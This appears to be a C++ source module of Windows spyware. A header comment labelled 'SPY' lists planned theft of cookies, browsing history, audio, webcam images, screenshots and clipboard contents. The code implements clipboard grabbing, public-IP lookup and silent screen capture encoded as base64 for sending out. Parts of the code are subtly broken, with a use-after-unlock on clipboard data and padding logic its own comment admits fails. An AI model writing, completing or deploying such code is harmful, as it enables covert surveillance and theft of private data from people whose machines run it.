/*
SPY:
grab cookies: return whatever
grab publicip: return string [ok]
grab history: return whatever (check jabor)
record audio
screenshot: return base64 (unless we can return a file, then get an API which screenshots and return the file)
webcam image: return base64, unless above, or whatever CV returns
clipboard: return string [ok]
*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>

#include "request.hh"

#pragma once

std::string grab_clipboard() {
    if (!OpenClipboard(NULL)) {
        return "failed to open clipboard";
    }
    HANDLE clipboard_data_handle = GetClipboardData(CF_TEXT);
    char* clipboard_data = static_cast<char*>(GlobalLock(clipboard_data_handle));
    GlobalUnlock(clipboard_data_handle);
    CloseClipboard();
    return clipboard_data;
}

std::string grab_ip() {
    return get_request("http://ifconfig.me/ip");
}

CLSID get_encoder_clsid(const WCHAR* format) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* codecs = nullptr;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return CLSID_NULL;
    codecs = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (codecs == nullptr) return CLSID_NULL;
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(codecs[i].MimeType, format) == 0) {
            CLSID clsid;
            clsid = codecs[i].Clsid;
            free(codecs);
            return clsid;
        }
    }
    free(codecs);
    return CLSID_NULL;
}

std::string grab_screenshot() {

    // initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // create a screen capture
    SetProcessDPIAware();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(GetDesktopWindow());
    int logSW = GetDeviceCaps(hdcScreen, HORZRES);
    int logSH = GetDeviceCaps(hdcScreen, VERTRES);
    int dpiX = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int dpiY = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    int sX = dpiX / 96;
    int sY = dpiY / 96;
    int cW = width * sX;
    int cH = height * sY;
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, cW, cH);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, cW, cH, hdcScreen, 0, 0, SRCCOPY);

    // save the screenshot to a memory stream
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsidEncoder = get_encoder_clsid(L"image/png");
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 100;
    encoderParams.Parameter[0].Value = &quality;

    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsidEncoder, &encoderParams);

    // get the size of the encoded data
    LARGE_INTEGER zeroOffset = { 0 };
    ULARGE_INTEGER streamSize;
    pStream->Seek(zeroOffset, STREAM_SEEK_END, &streamSize);
    pStream->Seek(zeroOffset, STREAM_SEEK_SET, nullptr);

    // read the encoded data from the stream
    std::vector<BYTE> buffer(streamSize.LowPart);
    ULONG bytesRead = 0;
    pStream->Read(buffer.data(), buffer.size(), &bytesRead);

    // convert the binary data to base64 string
    std::string base64;
    const std::string b64Chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    size_t inSize = buffer.size();
    size_t outSize = 4 * ((inSize + 2) / 3);

    base64.resize(outSize);
    unsigned char* input = buffer.data();
    unsigned char* output = reinterpret_cast<unsigned char*>(&base64[0]);

    for (size_t i = 0, j = 0; i < inSize;) {
        uint32_t octet_a = i < inSize ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octet_b = i < inSize ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octet_c = i < inSize ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        output[j++] = b64Chars[(triple >> 18) & 0x3F];
        output[j++] = b64Chars[(triple >> 12) & 0x3F];
        output[j++] = b64Chars[(triple >> 6) & 0x3F];
        output[j++] = b64Chars[triple & 0x3F];
    }

    // add padding characters if needed
    size_t padding = 3 - (inSize % 3);
    if (padding != 3)
        base64.resize(outSize - padding);

    // pad again, the previous black magic doesnt work
    int pad_length = base64.size() % 4;
    for (int i = 0; i != pad_length; i++) {
        base64 += "=";
    }

    // Clean up resources
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    DeleteObject(hBitmap);
    pStream->Release();
    return base64;
}